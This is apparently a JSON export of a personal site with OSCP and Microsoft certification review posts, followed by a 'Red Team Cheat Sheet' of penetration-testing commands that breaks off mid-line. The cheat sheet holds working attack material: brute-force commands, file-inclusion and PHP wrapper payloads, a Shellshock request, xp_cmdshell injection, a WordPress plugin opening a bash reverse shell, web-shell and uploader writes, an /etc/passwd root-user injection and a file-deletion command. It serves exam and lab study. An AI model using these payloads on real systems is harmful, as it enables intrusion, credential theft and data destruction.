{"Certifications/0000-OSCP-Review":{"slug":"Certifications/0000-OSCP-Review","filePath":"Certifications/0000 OSCP Review.md","title":"OSCP Review","links":[],"tags":["Certification"],"content":"\nIntroduction\nIn December 2022, I purchased the Learn One subscription for OSCP. I began studying the content at January 2023 since at the time I was focusing on obtaining other certificates such as:\n\nAZ-900\nSC-900\nMS-900\n\nOnce I successfully obtained those certificates I shifted my focus solely on OSCP. In the beginning it was difficult to go through the OSCP content since Offensive Security Student Mentors are only allowed to give hints about exercises for the different challenges. This forced me to dig deeper into things which I did not understand and after doing this for a while I got used to Thinking Out Of The Box or as Offensive Security says Try Harder.\nRestart\nWhen I was about 35% finished with the OSCP course materials, Offensive Security released a new version of OSCP. In the new version the content and the lab machines were significantly improved. The Buffer Overflow section was completely removed on the new PEN-200 after I spent 50-hours or more learning it.\nTry Harder\nI started studying the new OSCP (PEN-200) materials at April 2023 when it was released to everyone. I studied for every single day for 4-hours and on Saturdays and Sundays I spent more than 12-hours studying and after doing this for 3 months I had completely completed all the course content. The lab machines took me a month to finish and I managed to own 57/57 lab machines.\nPreperation\nOnce I completed all the course materials and lab machines, I decided to focus on Proving Grounds and HackTheBox machines to improve my penetration testing skills. Here’s a list of Proving Grounds and HackTheBox machines I would highly recommend trying out.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPlatformMachinesProving GrounsDRV4, Slort, Heist, EvilBox One, MoneyBox, and SarHackTheBoxMonitorsTwo, Busqueda, PC, Sunday, Irked, Lame, Shocker, Beep, Blue, Networked, Pilgrimage, Sau, Legacy, Optium, Bastard, Sniper\nI completed many more machines but these are some which I recommend doing to prepare for the OSCP exam. After successfully compromising these machines, I decided to book my exam and from there I solely focused on improving my notes for the exam.\nExam\nAt the time of the exam, I was about 15-minutes late since I thought the md5 hash would be sent to me on email 30-minutes before the exam starts. However, that wasn’t the case since the md5 hash was included included in the booking confirmation email.\nIn the beginning of the exam I was struggling for two hours to obtain the initial foothold on the active directory machines because I was following an never ending rabbit hole. After taking a break for 10 to 15 minutes I came back with a clear mind and managed to obtain the initial foothold for the active directory machine from there I successfully managed to lateral move through the active directory environment and compromise the domain controller.\nOnce the active directory set was compromised I decided to focus on compromising the two Linux machines and these machines were fairly easy to compromise as I was extremely familiar with Linux systems and the most common methodologies to compromise web applications.\nOnce I compromised these two Linux machines I decided to focus on the Windows machine which is not domain-joined and the initial foothold for the machine was fairly simple but the privilege escalation took me a really long time and after spending hours and hours, I successfully managed to compromise it. Here’s a quick overview of the time I spent to compromise all the different machines:\n\nActive Directory Set: 5 Hours\nLinux Machines Standalone (2 Machines): 4 Hours\nWindows Machine Standalone(1 Machine): 5 Hours\n\nAfter successfully compromising all the machines I spent some time going through my notes and taking screenshots to make sure that I didn’t miss anything for the report because Offensive Security (Offsec) requires that you use the following commands once you compromise a machine whoami, hostname, cat &lt;FLAG-LOCATION&gt; otherwise you may not receive the points for compromising the machine.\nI spent around 16 hours to complete the report and after delivering it in it took Offensive Security (Offsec) around two days to review it and confirm that I successfully passed the OSCP certification. I became extremely happy after passing OSCP since I spent the last 7 months studying for the certification. However, I know this is just the beginning of my long journey!"},"Certifications/0001-AZ-104-Certification-Review":{"slug":"Certifications/0001-AZ-104-Certification-Review","filePath":"Certifications/0001 AZ-104 Certification Review.md","title":"AZ-104 Certification Review","links":["Certifications/0002-AZ-500-Certification-Review","Certifications/0003-AZ-305-Certification-Review","Certifications/0004-MD-102-Certification-Review","Certifications/0005-MS-102-Certification-Review"],"tags":["Certification"],"content":"\nIntroduction\nI’m currently working as Azure Administrator and Office 365 Administrator on daily basis therefore recently I decided to pursue the Azure Administrator Associate (AZ-104) certification. In this blog post, I will share my insights and experience  with studying and taking the exam with the hope that it will assist you with your journey.\nPreparation\nFirst, I read through the Microsoft Learn: Azure Associate Administrator course and while going through the course I took notes and deployed the Azure resources in my personal environment to enhance my understanding. Here’s a brief overview of topics covered in the course:\n\nVirtual Machines\nVirtual Network\nNetwork Security Group\nWeb App Service\nContainers\nLoad Balancers\nApplication Gateway\nService Endpoints\nRecovery Site Vault\nStorage Accounts\nAzure Backups\n\nAfter completing the course materials I decided to expand my understanding by watching videos from Pluralsight and while going through the videos I also did the hands-on-labs challenges. Once the course materials were completed, I choose to memorize the different Azure resources by using spaced repetition.\nExam\nI’m usually nervous when I’m going to take a exam since I always feel as I know nothing compared to others. However, once the exam started I became more confident and the exam felt easy including the case study and the multiple of choices. After completing the multiple of choice questions and case study I choose to review the multiple of choice questions again to ensure I was confident with my choices, and after completing the review I delivered in the exam and saw a passing score of 737 of 1000.\nI felt extremely happy that I successfully managed to pass the Azure Administrator Associate certification. I still have a long way to go as I’m aiming to obtain AZ-500, AZ-305, MD-102, MS-102 certifications in 2024."},"Certifications/0002-AZ-500-Certification-Review":{"slug":"Certifications/0002-AZ-500-Certification-Review","filePath":"Certifications/0002 AZ-500 Certification Review.md","title":"AZ-500 Certification Review","links":["Certifications/0001-AZ-104-Certification-Review"],"tags":["Certification"],"content":"\nIntroduction\nOnce I obtained the AZ-104 Certification, I decided to continue learning more about Microsoft Azure but the security aspect of it. The Azure Security Engineer was the perfect certification for it as it goes through methodologies to secure our infrastructure in the cloud and our tenant inside Azure. In this post, I’ll share my experience with studying and taking the exam for the certification.\nPreparation\nFirst, I read through the Microsoft Learn: Azure Security Engineer course and while going through the course I took notes and deployed the different features in my own Azure environment. Here’s a quick overview of the concepts and resources that were covered in the course materials.\n\nMicrosoft Entra ID\nMicrosoft Entra ID Licenses\nMicrosoft Entra ID Groups\nMicrosoft Entra ID Roles\nAzure RBAC Roles\nMicrosoft Entra ID Protection\nConditional Access\nZero Trust\nMicrosoft Entra PIM\nMicrosoft Defender for Cloud/Endpoint/Servers/Storage/Key Vault\nAzure Enterprise Application\nAzure Blueprints\nAzure Bastion\nAzure Key Vault\nAzure SQL\nAzure Firewall\nManaged Identities\n\nUser-Assigned Identities\nSystem-Assigned Identities\n\n\nAzure Event Hub\nAzure Logic App\nAzure Geography\n\nAfter completing the course materials and the hands-on-labs, I decided to dig deeper into the different resources and features by creating diagrams to better understand the different concepts and the way they can be used together.\nflowchart TB;\n  subgraph &quot;Pass-Through Authentication&quot;\n    AD{Active Directory}\n    AAD{Microsoft Entra ID}\n    AAgent(Authentication Agent)\n    User(User)\n\n    AD &lt;-- Validation --&gt; AAgent &lt;--&gt; AAD &lt;--&gt; User --&gt; AD\n\n    style User fill:#b8f218,stroke:#333,stroke-width:1px\n  end\n\nThe diagrams significantly increased my understanding about the resources and features  as it forced me to reference different the different resources and features together. After creating tons of diagrams and linking multiple of resources and features together I decided to do multiple of choices which I found through Microsoft Learn, GitHub, and other places in the internet.\nExam\nWhen I’m studying for an certification I tend to over study therefore I decided to book the exam at 09:00 AM at 11/02/2024. The day I was going to take the exam I felt extremely nervous and once the exam started I became even more nervous as the exam had 57 questions, case study, and labs.\nThe multiple of choices, case study, and labs were extremely difficult and I spent a-lot of time answering these questions. I felt as the exam was meant to make me fail because I received a case study and labs in a single exam with 57 questions which is extremely rare according to multiple of people I spoke to. After delivering the exam the protocol software randomly crashed therefore I thought I failed the exam.\nHowever, once I visited my Microsoft profile I saw that I received a badge for passing the Azure Security Engineer certification. I went from feeling bad to feeling extremely happy because I thought I completely screwed up the exam but I passed it!"},"Certifications/0003-AZ-305-Certification-Review":{"slug":"Certifications/0003-AZ-305-Certification-Review","filePath":"Certifications/0003 AZ-305 Certification Review.md","title":"AZ-305 Certification Review","links":["Certifications/0002-AZ-500-Certification-Review"],"tags":["Certification"],"content":"\nIntroduction\nI obtained the AZ-500 Certification for a month ago and after passing the certification, I decided to get the Azure Solution Architect Expert (AZ-305) certification since the information’s in AZ-500 correlates with AZ-305. In this post, I’ll share my experience with studying and taking the exam for certification.\nPreparation\nAs always I first read through the Microsoft Learn: AZ-305 course. While going through the course I took notes and created graphs to further increase my understanding about Azure resources and features.  Here is an example of the graphs which I spent time making while taking notes:\nAzure Event Hub\nflowchart BT;\n\tsubgraph subgraph1[&quot;Data&quot;]\n\t\t1[Event Hub]\n\tend\n\tsubgraph subgraph2[&quot;Data&quot;]\n\t\t2(Streaming Data)\n\t\t3(Log, Files, Media)\n\t\t4(Weather Data)\n\t\t5(Business Data)\n\tend \n\tsubgraph subgraph3[&quot;Process&quot;]\n\t\t6[Azure Functions]\n\t\t7[Batch Analytics]\n\t\t8[Azure Data Explorer]\n\tend\n\tsubgraph2 --&gt; subgraph1\n\tsubgraph1 --&gt; subgraph3\n\nI also spent significant amount of time going through my notes and researching the different frameworks, resources and features as there were a-lot of things which I wasn’t quite familiar with such as:\n\nMicrosoft Cloud Adoption Framework\n\n\nAzure Service Fabric\nAzure Cache for Redis\nAzure Application Insights\nAzure Data Lake\nAzure Data Factory\nAzure IT Service Management Connector\nAzure NetApp\nAzure Diagnostic Extension\nAzure HDInsights\nAzure SQL Analytics\n\nOnce I became familiar with these frameworks, resources, and features I spent decent amount of time going through my notes from AZ-104, AZ-500, and AZ-305 course materials.\nExam\nToday at 20:00, I was going through my notes and re-calling the things which I forgot. While taking a break I decided to check if there were any AZ-305 exams seats available on PersonVUE and I saw one that was available in 20:30 so I quickly purchased it and joined the AZ-305 exam.\nMy adrenaline was extremely high during the AZ-305 exam as I was taking the exam without fully preparing for it which is abnormal for me. The multiple of choice questions were medium difficulty and the case study was easy because it was related to the course material in AZ-500.\nI completed the 59 questions in 45 minutes and accidentally ended up pressing the end button without realizing it. The screen took a bit time to load and once it successfully loaded I saw a passing score of 780! I was extremely relief and happy that I managed to obtain the Certified Azure Solution Architect certification."},"Certifications/0004-MD-102-Certification-Review":{"slug":"Certifications/0004-MD-102-Certification-Review","filePath":"Certifications/0004 MD-102 Certification Review.md","title":"MD-102 Certification Review","links":[],"tags":["Certification"],"content":"\nIntroduction\nI spent some time working with Microsoft Intune this year and became interested in learning more about it since it’s widely used across different organizations. The Microsoft Endpoint Administrator Associate (MD-102) was the perfect certification to learn more about Microsoft Intune.  In this post, I’ll share my experience with studying and taking the exam for the certification.\nPreparation\nI mostly spent my time learning about Microsoft Intune on Microsoft Learn: MD-102 as it contained a-lot of information’s for correctly configuring and securing our endpoint devices and much more:\n\nUsing the Enterprise Desktop Life Cycle as best practices for purchasing, managing, and retiring devices.\nConfiguring configuration profiles.\nConfiguring administrative templates, device restriction, and etc…\nImplementing Microsoft Defender using endpoint &amp; detection policies.\nSecuring devices and coperate using account protection policies and app protection policies.\nIncreasing security of organziation using Windows Hello for Business.\nImproving effectiveness of Microsoft Intune using tools such as endpoint analytics.\n\nI was unfamiliar with many of the concepts taught in the course and to improve my knowledge in Microsoft Intune, I decided to put the things I learnt into practice by troubleshooting Microsoft Intune issues which I was experiencing at work.\nAdditionally, I singed up for Microsoft Intune Trial which allowed me to play around with Microsoft Intune in my own environment. After becoming more familiar with Microsoft Intune, I started creating diagrams to better memorize the different resources and features in it.\nflowchart LR;\n\tsubgraph SupportedOn[&quot;Supported Devices&quot;]\n\t\t1(App Configuration Policy)\n\t\t2(iOS)\n\t\t3(iPadOS)\n\t\t4(Android)\n\t\t1 --&gt; 2\n\t\t1 --&gt; 3\n\t\t1 --&gt; 4\n\tend\n\t\n\t5(Line of Business Apps)\n\t6(Microsoft 365 Apps)\n\n\tSupportedOn --&gt; 5\n\tSupportedOn --&gt; 6\n\nThe diagrams so far has assisted me a-lot with understanding and memorizing complex concepts and I highly recommend everyone to make their own diagrams to challenge themselves on the different topics.\nFailed Exam Attempt\nAt 10 of May, I got home from work and started instantly studying for the Microsoft Endpoint Administrator Associate certification and after studying for a few hours I decided to book my exam and saw that one seat was available within 30 minutes. So, I quickly purchased the exam and took a break for 20 minutes and then joined the exam.\nThe multiple of choices questions were extremely hard and the case study were easy. After completing all the questions and case study, I delivered in the exam and saw that I failed with 635 of 1000. I felt disappointed of myself since I have never failed a certification exam but this was a good experience as it pushed me to learn more about Microsoft Intune.\nAnother Exam Attempt\nAt 17 of July, I was home and preparing for Microsoft Endpoint Associate certification and saw one seat was available within 1 hour. So, I quickly purchased the exam and took a hour break and then joined the exam.\nEverything was much different this time as multiple of choice questions were easy and the case study felt even easier. Once I completed selecting my answers for all the questions, I delivered in the exam and saw a passing score of 935 of 1000. I became so happy for passing the I became  Certified Microsoft Endpoint Administrator Associate certification since I spent a-lot of time learning about Microsoft Intune after failing the first exam attempt."},"Certifications/0005-MS-102-Certification-Review":{"slug":"Certifications/0005-MS-102-Certification-Review","filePath":"Certifications/0005 MS-102 Certification Review.md","title":"MS-102 Certification Review","links":[],"tags":["Certification"],"content":"\nIntroduction\nAbout two years ago I made myself a promise to obtain following certifications AZ-900, MS-900, SC-900, OSCP, AZ-500, AZ-104, AZ-305, and MS-102 to increase my knowledge about cloud technologies and cyber security. I’m happy to inform that I successfully passed the Microsoft 365 Administrator Expert certification on 3rd September of 2024. In this post, I’ll share my experience with studying and taking the Microsoft 365 Administrator Expert (MS-102) certification.\nPreparation\nAs always I recommend going through the Microsoft Learn: MS-102 course modules since it contains a lot of information’s about Microsoft 365 which you can’t obtain through other sites and videos. While going through the course I highly recommend practicing on your own Microsoft 365 environment as it will help you with understanding Microsoft 365 much better.\nUsually, after completing course materials I tend to go through my notes to create diagrams and relate the different information’s together. I highly recommend everyone doing that as it will help you with better understanding different resources and features. However, majority of the things I learnt through the course materials were already in the different certifications which I completed so far therefore I spent time doing spaced repetitions.\nExam\nAt 3 of September, I was studying for MS-102 certification for few hours, and I randomly decided to book the exam and saw that an spot was available within 30 minutes so I quickly purchased it and joined the exam. Once I was in the exam I ended up panicking a bit since I saw I had to answer 68 questions within 140 minutes. I actually thought getting 68 questions was impossible in a Microsoft exam since multiple of sources told me it’s only possible to get 40 to 60 questions.\nAnyway, the multiple of choice questions were fairly challenging but I managed to complete them without any issues and the case study was the most simplest part of the exam. After delivering in the exam, I saw a passing score of 820 / 1000.  I felt a huge relief after passing the Microsoft 365 Administrator Expert certification since I managed to complete all the goals I set up for myself for two years ago."},"Certifications/index":{"slug":"Certifications/index","filePath":"Certifications/index.md","title":"Certifications","links":[],"tags":[],"content":""},"Documents/0000-Red-Team-Cheat-Sheet":{"slug":"Documents/0000-Red-Team-Cheat-Sheet","filePath":"Documents/0000 Red Team Cheat Sheet.md","title":"The Red Team Cheat Sheet","links":[],"tags":[],"content":"Methodology\nEnumerate TCP ports:\n# Quick TCP Scan\nrustscan -a &quot;[IP]&quot;\n \n# Aggressive Scan\nnmap -sV -sC -p &quot;[PORTS]&quot; &quot;[IP]&quot; -o nmap.result\n \n# Nmap UDP Scan\nnmap -sU --top-ports 100 &quot;[IP]&quot;\nConnect to ports using Netcat:\nnc -nv &quot;[IP]&quot; &quot;[PORT]&quot;\nBrute-Force Directories:\n# Gobuster\ngobuster dir -u &quot;[URL]&quot; -w /usr/share/wordlists/dirbuster/\n \n# Ffuf\nfuff -u &quot;http://[IP]:[PORT]/FUZZ&quot; -w &quot;/usr/share/wordlists/dirb/common.txt&quot; -e txt,php,exe\n\n\nOSINT\n\nDefault Credentials.\nCollect emails.\nCollect usernames.\nCollect passwords.\n\n\n\nExploit\n\nSearch for exploit on GitHub\nSearch for exploit on ExploitDB\nModifying the IP-Address\nModifying the Port\n\n\n\nBrute-Force:\n# FTP\nsudo hydra -l &quot;[USERNAME]&quot; -P /usr/share/wordlists/rockyou.txt &quot;ftp://[IP]&quot;\n \n# SSH\nsudo hydra -l &quot;[USERNAME]&quot; -P /usr/share/wordlists/rockyou.txt &quot;ssh://[IP]&quot;\n \n# SMB\nsudo hydra -l &quot;[USERNAME]&quot; -P /usr/share/wordlists/rockyou.txt &quot;smb://[IP]&quot;\n\nWeb Application\n\nLocal File Inclusion &amp; Remote File Inclusion\nOS Command Injection\nSQL Injection\nWeb Browser Cookies\nHTML Code\nWeb Application Version\nDefault Credentials\nRegister Account With Company Email\n\n\n\nInternal:\n# Linux: Port Check\necho 1 &gt; /dev/tcp/[IP]/[PORT]; echo $?\nPort Enumeration\nNmap &amp; Rustscan:\n# Quick Port Scanning\nrustscan -a &quot;[IP]&quot;\nnmap -p- &quot;[IP]&quot;\n \n# Scanning for UDP Ports\nnmap -sU --top-ports 50 &quot;[IP]&quot;\n \n# Scanning for TCP Ports\nnmap -sT --top-ports 50 &quot;[IP]&quot;\n \n# Intrusive Scanning\nnmap -sV -sC -p- &quot;[IP]&quot; \nNetcat:\nnc -nv &quot;[IP]&quot; &quot;[PORT]&quot;\n\nhelp\ninfo\n/bin/bash -c whoami\nwhoami\nassist\n\nOSINT\nIt’s highly recommended to always collect information’s about the target.\n\nFirstname &amp; Lastname\nEmail\nDocuments\nApplication version\n\nWeb Enumeration\nDirectory\nInstallation:\nsudo apt-get install gobuster\nCommands:\n# Directory enumeration\nnmap -p 80 --script=http-enum &quot;[IP]&quot;\n \n# HTTP directory enumeration\ngobuster dir -u &quot;http://[IP]:[PORT]/&quot; -w &quot;/usr/share/wordlists/dirb/common.txt&quot;\n \ngobuster dir -u &quot;http://[IP]:[PORT]/&quot; -w &quot;/usr/share/wordlists/dirb/directory-list-2.3-small.txt&quot;\n \n# HTTPS directory enumeration\ngobuster dir -k -u &quot;https://[IP]:[PORT]/&quot; -w &quot;/usr/share/wordlists/dirb/common.txt&quot;\n \ngobuster dir -k -u &quot;https://[IP]:[PORT]/&quot; -w &quot;/usr/share/wordlists/dirb/directory-list-2.3-small.txt&quot;\n \n# Different extenstions\ngobuster dir -u &quot;http://[IP]:[PORT]/&quot; -w &quot;/usr/share/wordlists/dirb/directory-list-2.3-small.txt&quot; -x txt\n \n# Faster files/directory enuemration\nfuff -u &quot;http://[IP]:[PORT]/FUZZ&quot; -w &quot;/usr/share/wordlists/dirb/common.txt&quot; -e txt\nParameters\nParameter Brute-Force:\n# Non authenticated\nffuf -c -r -u &#039;http://192.168.190.212/secret/evil.php#039; -w /usr/share/wordlists/dirb/common.txt -fs 0\n \n# Authenticated\nffuf -c -r -u &#039;http://192.168.190.212/secret/evil.php#039; -w /usr/share/wordlists/dirb/common.txt -fs 0 -b &#039;PHPSESSID=...&#039;\nError Messages\nWhen an error message occurs we should always take a note of it since it could help us with our initial foothold access onto the target.\nAPI\n# Obtain information about API\ncurl -i &quot;[DOMAIN]:[PORT]/[API-DIR]&quot;\n \n# Send POST or GET request\ncurl –v –X OPTIONS &quot;[DOMAIN]:[PORT]/[API-DIR]&quot;\n \n# Including JSON into request: Register\ncurl -d &#039;{&quot;password&quot;:&quot;lab&quot;,&quot;username&quot;:&quot;offsec&quot;,&quot;email&quot;:&quot;pwn@offsec.com&quot;,&quot;admin&quot;:&quot;True&quot;}&#039; -H &#039;Content-Type: application/json&#039; &quot;http://[DOMAIN]/[API-DIR]&quot;\n \n# Including JSON into request: Login\ncurl -d &#039;{&quot;password&quot;:&quot;lab&quot;,&quot;username&quot;:&quot;offsec&quot;}&#039; -H &#039;Content-Type: application/json&#039; &quot;http://[DOMAIN]/[API-DIR]&quot;\n \n# Plaintext POST Request\ncurl -X POST --data &#039;[PARAMETER]=&#039; &quot;[DOMAIN]&quot;\nGit\n# Git-dumper Installation\npip install git-dumper\n \n# Download `.git` folder\nwget &quot;http://[IP]:[PORT]/.git&quot;\n \n# Enumerate `.git` folder\ngit logs\ngit show &quot;[COMMIT]&quot;\nLFI &amp; RFI\nFile Inclusion:\n?lang=en-page.php\n \n# LFI: Linux\n?lang=/etc/passwd\n \n# LFI: Windows\n?lang=/boot.ini\n \n# SMB Service\nsudo systemctl restart smbd\n \n?lang=\\\\[IP]\\temp\\rev.php\n \n# HTTP Service\npython3 -m http.server -m\n \n?lang=http://[IP]/rev.php\nPHP Wrapper:\n# PHP Wrapper\ndata://text/plain,&lt;? php echo shell_exec(&quot;dir&quot;) ?&gt;\n \n# PHP Wrapper Base64\ndata://text/plain,PD9waHAgZWNobyBzaGVsbF9leGVjKCJkaXIiKSA/Pgo=\n \n# Display `admin.php` as Base64\nphp://filter/convert.base64-encode/resource=&quot;[DISPLAY-FILE]&quot;\n \n# Example 1\nmenu.php://text/plain,&lt;?php echo shell_exec(&quot;dir&quot;)?&gt;\n \n# Example 2\nmenu.php://text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCJkaXIiKSA/Pgo=\n \n# Example 3\nmenu.php://filter/convert.base64-encode/resource=&quot;[DISPLAY-FILE]&quot;\nCGI-Bin\nBruteforcing CGI-Bin:\n# Brute-Forcing\nffuf -u &quot;http://[IP]/cgi-bin/FUZZ&quot; -w &quot;/usr/share/wordlists/dirb/common.txt&quot; -e &quot;.cgi, .sh, .pl&quot;\n \n# Exploit\ncurl -H &#039;User-Agent: () { :; }; /bin/bash -c &quot;sleep 5&quot;&#039; &quot;http://10.10.10.56/cgi-bin/[SCRIPT-NAME]&quot;\nFile Upload\n.htaccess:\necho &quot;AddType application/x-httpd-php .xxx&quot; &gt; .htaccess\nCommands:\n# Add `89 50 4E 47 0D 0A 1A 0A` into the beginning\nhexeditor &quot;reverse-shell.php&quot;\nFile Extensions Names:\n\nfile.png.php\nfile.png.pHp5\nfile.php#.png\nfile.php%00.png\nfile.php\\x00.png\nfile.php%0a.png\nfile.php%0d%0a.png\nfile.phpJunk123png\nfile.png.php\nfile.png.Php5\n\nResources\n\nList Of File Signatures\n\nSQL Injection\nMSSQL Injection Commands:\nadmin&#039;; EXEC xp_cmdshell &quot;ping [IP]&quot;; --\nadmin&#039;; EXEC &quot;sp_configure &#039;xp_cmdshell&#039;, &#039;1&#039;&quot;; --\nadmin&#039;; EXEC xp_cmdshell &quot;powershell -e JABjAGwAaQBl...&quot;; --\nSQL Injection Commands:\nadmin&#039;; show tables; --\nadmin&#039;; select * from users; ---\nadmin&#039;; INSERT INTO &quot;users&quot; (id, name, password) VALUES (NULL, NULL, NULL); --\nPostgreSQL\nDefault Credential:\n\npostgres:postgres\n\nPSQL Login Command:\npsql -h &quot;[TARGET-IP]&quot; -U &quot;[USERNAME]&quot; -W\nPSQL Database Commands:\n# Shows version\nSELECT VERSION();\n \n# Shows tables\n/d\n \n# List tables from current schema\n\\dt\n \n# Lists tables from all schema\n\\dt &lt;name-of-schema&gt;.*\nMySQL\nDefault Credentials\n\nroot:root\nroot:toor\nroot:no password\n\nWordPress\nWPScan Commands:\n# Update WPScan\nwpscan --update\n \n# Enumerates through plugins\nwpscan --url &quot;[TARGET]&quot; --enumerate p --plugins-detection aggressive\n \n# Enumerates vulnerable plugins, users, vulrenable themes, timthumbs\nwpscan --url &quot;[TARGET]&quot; --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log\n \n# Brute Force\nwpscan --url &quot;[TARGET]&quot; --usernames &quot;[USERNAMES]&quot; --passwords &quot;[PASSWORDS]&quot;\nWordPress Database Enumeration:\n# Searching through WordPress options\nselect * from wp_options;\n&lt;?php\n \n/**\n* Plugin Name: Reverse Shell Plugin\n* Plugin URI:\n* Description: Reverse Shell Plugin\n* Version: 1.0\n* Author: Vince Matteo\n* Author URI: www.sevenlayers.com\n*/\n \nexec(&quot;/bin/bash -c &#039;bash -i &gt;&amp; /dev/tcp/192.168.45.152/80 0&gt;&amp;1&#039;&quot;);\n?&gt;\nPhpMyAdmin\nDefault Credentials:\n\nroot:root\nroot:no password\n\nPHP Backdoor:\nSELECT &quot;&lt;?php system($_GET[&#039;cmd&#039;]); ?&gt;&quot; into outfile &quot;C:\\\\xampp\\\\htdocs\\\\backdoor.php&quot;\n \nSELECT &quot;root:$1$ARg8T8zS$sKQkSE6vj8uppky8/EbOV0:0:0:root:/root:/bin/bash&quot; &gt;&gt; &quot;/etc/passwd&quot;\n \n\\! rm -f /etc/passwd\nPHP Reverse Shell:\nSELECT \n&quot;&lt;?php echo \\&#039;&lt;form action=\\&quot;\\&quot; method=\\&quot;post\\&quot; enctype=\\&quot;multipart/form-data\\&quot; name=\\&quot;uploader\\&quot; id=\\&quot;uploader\\&quot;&gt;\\&#039;;echo \\&#039;&lt;input type=\\&quot;file\\&quot; name=\\&quot;file\\&quot; size=\\&quot;50\\&quot;&gt;&lt;input name=\\&quot;_upl\\&quot; type=\\&quot;submit\\&quot; id=\\&quot;_upl\\&quot; value=\\&quot;Upload\\&quot;&gt;&lt;/form&gt;\\&#039;; if( $_POST[\\&#039;_upl\\&#039;] == \\&quot;Upload\\&quot; ) { if(@copy($_FILES[\\&#039;file\\&#039;][\\&#039;tmp_name\\&#039;], $_FILES[\\&#039;file\\&#039;][\\&#039;name\\&#039;])) { echo \\&#039;&lt;b&gt;Upload Done.&lt;b&gt;&lt;br&gt;&lt;br&gt;\\&#039;; }else { echo \\&#039;&lt;b&gt;Upload Failed.&lt;/b&gt;&lt;br&gt;&lt;br&gt;\\&#039;; }}?&gt;&quot;\nINTO OUTFILE &#039;C:/wamp/www/uploader.php&#039;;\nCredentials\nOnce we obtain credentials we should always try to re-use them:\nDefault Passwords:\n\nadmin:admin\nroot:root\nadministrator:password\nadmin:password\n\nPasswordless (PhpMyAdmin):\n\nroot\nadmin\nadministrator\n\nWe should always research if the application has a default credentials logins too.\nSteganography\n\nSteganography String: %&amp;&#039;()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz\nSteganography String: &amp;&#039;()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz\n\nExtract File from .jpg:\nsteghide extract -sf &quot;JPG-FILE&quot;\nBrute-Force Passwords:\nfor i in $(cat /usr/share/wordlists/rockyou.txt); do echo &#039;[+] Trying &#039; $i; steghide extract -sf &quot;JPG-FILE&quot; --passphrase $i; done \nSSH Key\nSSH Keys:\n\nid_ecdsa\nid_rsa\n\nCommands:\n# Generate SSH Key\nssh-keygen\n \n# Permission\nchmod -R 600 id_rsa\n \n# 1. Transfer the file `id_rsa.pub` to target machine as `authorized_keys`\n# 2. Login using the `id_rsa` key\nService Enumeration\nSMTP - 25\nTelnet &amp; Netcat:\ntelnet &quot;[IP]&quot; &quot;[PORT]&quot;\nnc -nv &quot;[IP]&quot; &quot;[PORT]&quot;\nNmap:\n# Searches for available commands\nnmap -p &quot;25,465,587&quot; --script=smtp-commands &quot;[IP]&quot;\n \n# Searches for users\nnmap -p &quot;25,465,587&quot; --script=smtp-enum-users &quot;[IP]&quot;\n \n# Information disclosure (OS, NetBIOS, and DNS)\nnmap -p 587 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=&quot;example.com&quot; &quot;[IP]&quot;\nSwaks Commands:\nswaks --from &#039;username@example.com&#039; --to &quot;username@example.com&quot; --attach &quot;/ftphome/config.library-ms&quot; -s &quot;[SERVER-IP]&quot; --header &quot;Subject: Urgent&quot; --body &quot;Message&quot; --suppress-data -ap\nDNS - 53\nHost Commands:\n# Nameserver\nhost -t NS &quot;[IP]&quot;\n \n# Displays DNS Zone Transfer information\nhost -l &quot;example.com&quot; &quot;10.0.0.0&quot;\n \n# Displays `TXT` of domain \nhost -t txt -l &quot;example.com&quot; &quot;10.0.0.0&quot;\nDig Commands:\n# Banner Grabbing\ndig version.bind CHAOS TXT &quot;@10.0.0.0&quot;\n \n# DNS Zone Transfer\ndig axfr &quot;@10.0.0.0&quot; &quot;example.com&quot;\nDNSRecon Commands:\n# Enumerate DNS\nsudo dnsrecon -d &quot;[DOMAIN]&quot; -t axfr\n \n# Brute-Force Subdomains with DNSRecon\nsudo dnsrecon -d &quot;[DOMAIN]&quot; -D &quot;[SUB-DOMAIN]&quot; -t brt\nDNSEnum Commands:\ndnsenum &quot;[DOMAIN]&quot;\nFinger - 79\nCommands:\n# Searching for users\n./finger-user-enum.pl -t &quot;[IP]&quot; -U &quot;/usr/share/seclists/Usernames/Names/names.txt&quot;\n \n# Shows information about user\nfinger -s &quot;[USER]@[HOST]&quot;\n \n# Shows home directory of user\nfinger -sl &quot;[USER]@[HOST]&quot;\n \n# All informations\nfinger -slp &quot;[USER]@[HOST]&quot;\nResource:\n\nFinger-User-Enum\n\nSMB - 139, 445\nSMB Vulnerability Scanner:\nnmap &quot;[IP]&quot; --script smb-vuln-*\nSMB Version Detector:\nmsfconsole\nuse auxiliary/scanner/smb/smb_version\nset rhosts &quot;[IP]&quot;\nrun\nSMBClient Commands:\n# List shares\nsmbclient -L &quot;\\\\\\\\[IP]\\\\&quot;\n \n# Login as anonymous\nsmbclient &quot;\\\\\\\\[IP]\\\\[SHARE]&quot; -U anonymous\n \n# Login as a user\nsmbclient &quot;\\\\\\\\[IP]\\\\[SHARE]&quot; -U &quot;[USERNAE]&quot;\n \n# Download everything\nmask &quot;&quot;\nrecurse ON\nprompt OFF\nmget *\nEnum4Linux Commands:\n# Unauthenticated enumeration\nenum4linux -a &quot;[IP]&quot;\n \n# Authenticated enumeration\nenum4linux -a -u &quot;[USERNAME]&quot; -p &quot;[PASSWORD]&quot; &quot;[IP]&quot;\nSNMP - 161,  162\nIdentifying Commands:\n# Community strings\necho &quot;public&quot; &gt; community\necho &quot;private&quot; &gt;&gt; community\necho &quot;manager&quot; &gt;&gt; community\n \n# List of machines\nfor i in $(seq 1 254); do echo &quot;192.168.0.$i&quot; &gt;&gt; ips.txt; done\n \n# Identify machines running SNMP\nonesixyone -c community -i ips.txt\nEnumeration Commands:\n# All\nsnmpwalk -c public -v1 -t 1 &quot;[IP]&quot;\n \n# Running Processes\nsnmpwalk -c public -v1 &quot;[IP]&quot; &quot;1.3.6.1.2.1.25.1.6.0&quot;\n \n# Open Ports\nsnmpwalk -c public -v1 &quot;[IP]&quot; &quot;1.3.6.1.2.1.6.13.1.3&quot;\n \n# nsExtendObjects\nsnmpwalk -v 1 -c public &quot;[IP]&quot;  NET-SNMP-EXTEND-MIB::nsExtendObjects\nSquid - 3128\nCommands:\n# Curl with proxy\ncurl --proxy &quot;http://[IP]:3128&quot; &quot;http://[IP]/&quot;\n \n# /etc/proxychains \nhttp 